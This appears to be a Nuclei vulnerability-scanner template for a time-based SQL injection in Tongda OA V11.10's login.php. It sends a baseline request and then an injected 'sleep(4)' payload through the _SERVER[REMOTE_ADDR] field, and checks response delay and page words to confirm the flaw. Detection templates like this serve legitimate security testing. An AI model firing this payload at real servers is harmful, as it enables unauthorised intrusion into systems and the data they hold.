id: tongda-login-sqli

info:
  name: 通达OA V11.10 login.php SQL注入漏洞
  author: tongda
  severity: high
  tags: tongda

http:
  - raw:
      - |
        POST /ispirit/interface/login.php HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: PHPSESSID=1; KEY_RANDOMDATA=1858
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        name=123&pass=123&_SERVER[REMOTE_ADDR]=1

      - |
        POST /ispirit/interface/login.php HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: PHPSESSID=1; KEY_RANDOMDATA=1858
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+sleep(4)+limit+0,1))--+

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1 < 2'
          - 'duration_2 >= 4'
          - 'duration_2 <= 10'
        condition: and
      - type: word
        part: body
        words:
          - 'fieldset'
          - 'legend'
        condition: and

